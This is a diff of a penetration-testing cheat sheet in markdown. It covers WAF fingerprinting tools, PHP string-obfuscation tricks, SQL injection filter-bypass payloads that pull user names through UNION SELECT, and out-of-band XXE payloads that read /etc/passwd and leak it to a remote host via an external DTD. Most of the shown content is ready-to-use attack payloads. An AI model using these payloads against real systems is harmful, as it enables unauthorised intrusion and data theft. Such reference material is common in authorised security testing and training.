@@ -28,81 +28,47 @@
 
 https://www.silisoftware.com/tools/ipconverter.php
 
+### Response - Status code WAF'S
+
+-> mod_security -> 406 Not Acceptable
+
+-> AQTRONIX WebKnight -> 999 No hacking
+
+### Tool's
+
+-> wafw00f 
+
+https://github.com/EnableSecurity/wafw00f
+
+-> nmap --script=http-waf-fingerprint
+
+https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
+
+-> imperva-detect
+
+https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh
+
+#### Others
+
+https://github.com/0xInfection/Awesome-WAF
+
 ## PHP Obfuscation Techniques:
-
--> Arithmetic Operators
-
-$§ = 'b';
-
-$§++;
-
-//c
-
-$§ = 'z'
-
-$§++;
-
-//aa
-
-$§ = 'A';
-
-$§++;
-
-//B
-
-$§ = 'a1';
-
-$§++;
-
-//a2
-
-### Bitwise Operators
-
-https://www.php.net/manual/en/language.operators.bitwise.php
-
-Ex:
-
-$a & $b
-
-$a | $b	
-
-$a ^ $b
-
-~ $a
-
-$a << $b
-
-$a >> $b
 
 ### Mix - Hex + Octal
 
-echo "t\x72\x69\143\153s"
+echo "t\x72\x69\143\153s";
 
-x72 hex = r
-
-x69 hex = i
-
-143 octal = c
-
-153 octal = k
+//Tricks
 
 ### Variable Parsing
 
-$a = "ri";
+$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";
 
-$b ="ck";
-
-echo "T$a[0]$a[1]$b[0]$b[1]s";
+//Tricks
 
 ### Variable Variables
 
-$a = "T";
-
-$$a = "ri";
-
-$$$a = "cks";
-
-echo $a.$T.$ri;
+$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;
 
 //Tricks
 
@@ -127,30 +93,6 @@ https://hackvertor.co.uk/public
 ### PHP Obfuscation - base64+gzdeflate
 
 codes/obufscation/obfuscation.php
-
-### Response - Status code WAF'S
-
--> mod_security -> 406 Not Acceptable
-
--> AQTRONIX WebKnight -> 999 No hacking
-
-### Tool's
-
--> wafw00f 
-
-https://github.com/EnableSecurity/wafw00f
-
--> nmap --script=http-waf-fingerprint
-
-https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
-
--> imperva-detect
-
-https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh
-
-#### Others
-
-https://github.com/0xInfection/Awesome-WAF
 
 ## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
 
@@ -553,11 +495,11 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 #### Add comment /* */ for space bypass
 
-'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -
+'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -
 
-#### Add comment /*!*/ in query for filters bypass
+#### Add comment /\*!\*/ in query for filters bypass
 
-'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -
+'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -
 
 #### Add random case
 
@@ -565,12 +507,14 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
 
 #### Example of mix:
 
-'/*!UnIoN/**/SeLeCt/**/*/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -
+'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -
 
 #### Others Techniques:
 
 -> urlencode (example:%20 instead of space);
+  
 -> Scientifc Notation;
+  
 -> hexadecimal, substr, etc...
   
 ### Webshell via SQLI
@@ -711,7 +655,7 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 \<!DOCTYPE okay[
 
-\<!ENTITY % ult SYSTEM "http://10.10.12.228/evil.dtd">
+\<!ENTITY % ult SYSTEM "http://ip/evil.dtd">
 
 %ult;
 
@@ -725,7 +669,7 @@ codes/xxe_oob/evil.dtd
   
 \<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
   
-\<!ENTITY % payload "<!ENTITY &\#37; remote SYSTEM 'http://10.10.12.228/?leak=%file;'>">
+\<!ENTITY % payload "<!ENTITY &\#37; remote SYSTEM 'http://ip/?leak=%file;'>">
   
 %payload;
   
